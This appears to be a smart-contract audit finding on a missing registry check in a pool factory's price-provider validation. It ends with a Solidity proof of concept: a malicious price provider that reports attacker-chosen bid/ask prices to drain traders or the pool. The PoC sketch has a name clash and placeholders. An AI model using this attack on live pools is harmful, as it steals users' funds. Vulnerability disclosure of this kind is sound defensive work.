### Title
Unvalidated `priceProvider` in `MetricOmmPoolFactory._validatePriceProvider` allows arbitrary bid/ask manipulation — (File: `metric-core/contracts/MetricOmmPoolFactory.sol`)

---

### Summary

`MetricOmmPoolFactory._validatePriceProvider` only checks that the provider's `token0()/token1()` match the pool's tokens. It never calls `AnchoredProviderFactory.isProvider()`, the predicate the oracle system explicitly documents as the "public-pool eligibility" gate. Any permissionless caller can deploy a contract implementing `IPriceProvider` that passes the token-match check but returns arbitrary bid/ask prices, bypassing every oracle safety guarantee the `AnchoredProviderFactory` enforces.

---

### Finding Description

`MetricOmmPoolFactory.createPool` is permissionless. Its only price-provider guard is `_validatePriceProvider`:

```solidity
// metric-core/contracts/MetricOmmPoolFactory.sol L541-546
function _validatePriceProvider(address token0, address token1, address priceProvider) internal view {
    if (priceProvider == address(0)) revert InvalidPriceProvider();
    if (IPriceProvider(priceProvider).token0() != token0 || IPriceProvider(priceProvider).token1() != token1) {
        revert PriceProviderTokenMismatch();
    }
}
``` [1](#0-0) 

The `IPriceProvider` interface is minimal — three functions, no authentication:

```solidity
// smart-contracts-poc/contracts/interfaces/IPriceProvider (via metric-core)
interface IPriceProvider {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getBidAndAskPrice() external returns (uint128 bid, uint128 ask);
}
``` [2](#0-1) 

Meanwhile, `AnchoredProviderFactory` explicitly documents and exposes the correct eligibility predicate:

```solidity
// smart-contracts-poc/contracts/AnchoredProviderFactory.sol L279-283
/// @notice The public-pool eligibility predicate: deployed by this factory ⇒ clamp-bounded quotes
///         with parameters that were inside the envelope at deploy time.
function isProvider(address provider) external view returns (bool) {
    return _providers.contains(provider);
}
``` [3](#0-2) 

The factory-level comment reinforces the intent: *"public-pool eligibility is then the machine-checkable predicate `recognizedFactory.isProvider(p)`"*. [4](#0-3) 

`MetricOmmPoolFactory` never imports or calls `AnchoredProviderFactory`. The same weak `_validatePriceProvider` is also called on the post-creation price-provider update path:

```solidity
// metric-core/contracts/MetricOmmPoolFactory.sol L483, L502
_validatePriceProvider(p.token0, p.token1, newPriceProvider);   // proposePoolPriceProvider
_validatePriceProvider(p.token0, p.token1, pending);             // executePoolPriceProviderUpdate
``` [5](#0-4) [6](#0-5) 

An attacker deploys a contract that:
1. Returns the correct `token0()/token1()` during the factory's view call — passes `_validatePriceProvider`.
2. Returns attacker-controlled bid/ask values from `getBidAndAskPrice()` at swap time — bypasses every `AnchoredPriceProvider` safety guarantee (staleness check, `MAX_SPREAD_BPS` circuit breaker, `minMargin` floor, band clamp, `priceGuard`).

The `AnchoredPriceProvider` band clamp that the protocol relies on for safety:

```solidity
// smart-contracts-poc/contracts/AnchoredPriceProvider.sol L342-346
uint256 bidOut = Math.min(refBid, cBid);
uint256 askOut = Math.max(refAsk, cAsk);
if (bidOut == 0 || bidOut >= askOut) {
    return (0, type(uint128).max);
}
``` [7](#0-6) 

…is entirely absent from a malicious provider. The pool calls `getBidAndAskPrice()` unconditionally and trusts the result.

---

### Impact Explanation

A pool backed by a malicious price provider can return any bid/ask pair — inverted, zero, or extreme — at any time the attacker chooses. Every swap executed against that pool uses the corrupted quote directly in `SwapMath`, causing:

- **Swap conservation failure**: the pool receives more input than the oracle curve permits, or the trader receives more output than owed.
- **Bad-price execution**: stale, inverted, or unbounded bid/ask reaches the swap path with no clamp.
- **Direct loss of user principal**: traders who swap against the pool lose funds to the attacker-controlled price.

---

### Likelihood Explanation

`createPool` is fully permissionless. No special role or capital is required beyond deploying a two-function stub. The same gap applies to the post-creation `proposePoolPriceProvider` / `executePoolPriceProviderUpdate` path, which is gated only by the pool-admin role (a role the pool creator holds from inception). The attack requires no flash loan, no governance vote, and no oracle manipulation.

---

### Recommendation

Add a reference to the `AnchoredProviderFactory` (or a registry of trusted provider factories) in `MetricOmmPoolFactory` and enforce the `isProvider` predicate inside `_validatePriceProvider`:

```solidity
function _validatePriceProvider(address token0, address token1, address priceProvider) internal view {
    if (priceProvider == address(0)) revert InvalidPriceProvider();
    if (!anchoredProviderFactory.isProvider(priceProvider)) revert InvalidPriceProvider();
    if (IPriceProvider(priceProvider).token0() != token0 || IPriceProvider(priceProvider).token1() != token1) {
        revert PriceProviderTokenMismatch();
    }
}
```

This mirrors the Augur fix exactly: *"Anyone can create a new `AffiliateValidator` instance using the known contract template, and the `Market` contract ensures the specified validator is one of these instances."*

---

### Proof of Concept

```solidity
// Malicious provider — passes _validatePriceProvider, returns attacker-chosen prices
contract MaliciousProvider is IPriceProvider {
    address public immutable token0;
    address public immutable token1;
    uint128 public bid;
    uint128 public ask;

    constructor(address t0, address t1) { token0 = t0; token1 = t1; }

    // Passes factory validation
    function token0() external view returns (address) { return token0; }
    function token1() external view returns (address) { return token1; }

    // Attacker sets any price at will
    function setPrice(uint128 b, uint128 a) external { bid = b; ask = a; }
    function getBidAndAskPrice() external returns (uint128, uint128) { return (bid, ask); }
}

// Attack
MaliciousProvider mp = new MaliciousProvider(token0, token1);
mp.setPrice(legitimateBid, legitimateAsk);          // pass initial validation
factory.createPool(PoolParameters({ priceProvider: address(mp), ... }));

// Later, at swap time:
mp.setPrice(type(uint128).max - 1, type(uint128).max); // extreme ask → traders receive near-zero output
// OR
mp.setPrice(1, 2);                                  // near-zero bid → pool drains token0 at 1 wei/unit
```

The pool calls `mp.getBidAndAskPrice()` with no further validation. The corrupted quote flows directly into `SwapMath`, causing immediate loss to any trader executing against the pool.

### Citations

**File:** metric-core/contracts/MetricOmmPoolFactory.sol (L480-491)
```text
    PoolImmutables memory p = IMetricOmmPool(pool).getImmutables();
    uint256 timelock = priceProviderTimelock[pool];
    if (p.immutablePriceProvider != address(0)) revert PriceProviderImmutable();
    _validatePriceProvider(p.token0, p.token1, newPriceProvider);

    address mutableProvider = PoolStateLibrary._slot3(pool);
    address current = mutableProvider != address(0) ? mutableProvider : p.immutablePriceProvider;
    uint256 executeAfter = block.timestamp + timelock;
    pendingPriceProvider[pool] = newPriceProvider;
    pendingPriceProviderExecuteAfter[pool] = executeAfter;
    emit PoolPriceProviderChangeProposed(pool, current, newPriceProvider, executeAfter);
  }
```

**File:** metric-core/contracts/MetricOmmPoolFactory.sol (L500-506)
```text
    PoolImmutables memory p = IMetricOmmPool(pool).getImmutables();
    if (p.immutablePriceProvider != address(0)) revert PriceProviderImmutable();
    _validatePriceProvider(p.token0, p.token1, pending);
    IMetricOmmPoolFactoryActions(pool).setPriceProvider(pending);
    delete pendingPriceProvider[pool];
    delete pendingPriceProviderExecuteAfter[pool];
    emit PoolPriceProviderUpdated(pool, pending);
```

**File:** metric-core/contracts/MetricOmmPoolFactory.sol (L541-546)
```text
  function _validatePriceProvider(address token0, address token1, address priceProvider) internal view {
    if (priceProvider == address(0)) revert InvalidPriceProvider();
    if (IPriceProvider(priceProvider).token0() != token0 || IPriceProvider(priceProvider).token1() != token1) {
      revert PriceProviderTokenMismatch();
    }
  }
```

**File:** metric-core/contracts/interfaces/IPriceProvider/IPriceProvider.sol (L7-16)
```text
interface IPriceProvider {
  /// @notice Base token quoted by this provider; for Metric pools this must equal pool `token0`.
  function token0() external view returns (address baseToken);

  /// @notice Quote token quoted by this provider; for Metric pools this must equal pool `token1`.
  function token1() external view returns (address quoteToken);

  /// @notice Bid and ask in Q64.64 fixed-point as `uint128` pair (canonical for pool mid/spread math when applicable).
  function getBidAndAskPrice() external returns (uint128 bidPrice, uint128 askPrice);
}
```

**File:** smart-contracts-poc/contracts/AnchoredProviderFactory.sol (L10-16)
```text
/// @notice Anchor Factory: deploys AnchoredPriceProviders against an ADMIN-curated allow-list of
///         reference oracles, with clamp parameters validated against multisig-tuned pair-class
///         envelopes. createAnchoredProvider names which allow-listed oracle to anchor to; public-pool
///         eligibility is then the machine-checkable predicate `recognizedFactory.isProvider(p)`.
///         The allow-list starts EMPTY at construction and is populated/curated via addOracle /
///         removeOracle (admin) — removal only blocks NEW providers; already-deployed providers keep
///         their immutable oracle and stay isProvider()==true.
```

**File:** smart-contracts-poc/contracts/AnchoredProviderFactory.sol (L279-283)
```text
    /// @notice The public-pool eligibility predicate: deployed by this factory ⇒ clamp-bounded quotes
    ///         with parameters that were inside the envelope at deploy time.
    function isProvider(address provider) external view returns (bool) {
        return _providers.contains(provider);
    }
```

**File:** smart-contracts-poc/contracts/AnchoredPriceProvider.sol (L340-348)
```text
        // 8. Clamp: out-of-band custom quotes are clipped silently to the band edge.
        //    bid ≤ refBid < refAsk ≤ ask, so bid < ask holds by construction.
        uint256 bidOut = Math.min(refBid, cBid);
        uint256 askOut = Math.max(refAsk, cAsk);
        if (bidOut == 0 || bidOut >= askOut) {
            return (0, type(uint128).max);
        }

        return (uint128(bidOut), uint128(askOut));
```
